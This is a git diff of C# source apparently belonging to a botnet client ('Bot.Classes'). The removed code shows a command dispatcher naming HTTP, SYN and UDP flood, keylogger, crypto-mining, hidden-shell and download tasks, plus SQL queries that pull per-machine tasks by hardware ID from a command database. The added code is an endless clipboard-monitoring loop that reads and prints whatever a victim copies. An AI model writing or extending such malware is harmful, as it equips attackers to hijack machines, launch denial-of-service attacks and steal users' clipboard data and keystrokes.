@@ -1,6 +1,8 @@
 ﻿using System.Reflection;
 using System.Data.SqlClient;
 using System;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace Bot.Classes
 {
@@ -46,113 +48,30 @@ namespace Bot.Classes
             }
         }
 
-        public static void Task(string type)
+
+        public static string GetClipboardText()
         {
-            switch (type)
-            {
-                case "clipboard":
-                    Console.WriteLine("Clipboard");
-                    break;
-                case "http":
-                    Console.WriteLine("HTTP");
-                    break;
-                case "syn":
-                    Console.WriteLine("SYN");
-                    break;
-                case "udp":
-                    Console.WriteLine("UDP");
-                    break;
-                case "download":
-                    Console.WriteLine("Download");
-                    break;
-                case "firefox":
-                    Console.WriteLine("Firefox");
-                    break;
-                case "homepage":
-                    Console.WriteLine("homepage");
-                    break;
-                case "keylogger":
-                    Console.WriteLine("keylogger");
-                    break;
-                case "mine":
-                    Console.WriteLine("mine");
-                    break;
-                case "cleanse":
-                    Console.WriteLine("cleanse");
-                    break;
-                case "update":
-                    Console.WriteLine("update");
-                    break;
-                case "uninstall":
-                    Console.WriteLine("uninstall");
-                    break;
-                case "viewhidden":
-                    Console.WriteLine("viewhidden");
-                    break;
-                case "viewvisable":
-                    Console.WriteLine("viewvisable");
-                    break;
-                case "shellhidden":
-                    Console.WriteLine("shellhidden");
-                    break;
-                case "shellvisable":
-                    Console.WriteLine("shellvisable");
-                    break;
-                default:
-                    Console.WriteLine("what");
-                    break;
-            }
-        }
-        
-        public static int[] getTaskID()
-        {
-            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-            {
-                conn.Open();
-                int[] TaskID = new int[getTaskAmount() + 1];
-                for (int i = 0; i < getTaskAmount(); i++)
-                {
-                    using (SqlCommand cmd = new SqlCommand("SELECT DISTINCT TaskID FROM (SELECT TaskID, DENSE_RANK() OVER (order by TaskID) AS rownum FROM Tasks WHERE HWID = @HWID GROUP BY TaskID ) AS tbl WHERE tbl.rownum = @i;", conn))
-                    {
-                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                        cmd.Parameters.AddWithValue("i", i + 1);
-                        TaskID[i] = (int)cmd.ExecuteScalar();
-                        cmd.Parameters.Clear();
-                    }
-                }
-                return TaskID;
-            }
+            string result = "";
+
+            Thread thread = new Thread(() => result = Clipboard.GetText());
+            thread.SetApartmentState(ApartmentState.STA);
+            thread.Start();
+            thread.Join();
+
+            return result;
         }
 
-        public static int getTaskAmount()
+        public static void clip()
         {
-            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
+            string last = "";
+            do
             {
-                conn.Open();
-                int TaskAmount = 0;
-                using (SqlCommand cmd = new SqlCommand("SELECT TaskAmount FROM bots where HWID = @HWID", conn))
+                if (last != GetClipboardText())
                 {
-                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                    TaskAmount = (int)cmd.ExecuteScalar();
+                    Console.WriteLine(GetClipboardText());
+                    last = GetClipboardText();
                 }
-                return TaskAmount;
-            }
-        }
-
-        public static string getTask(int i)
-        {
-            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-            {
-                conn.Open();
-                string Type = "";
-                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID AND TaskID = @TaskID;", conn))
-                {
-                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                    cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
-                    Type = cmd.ExecuteScalar().ToString();
-                }
-                return Type;
-            }
+            } while (true);
         }
 
         public static bool Registered()
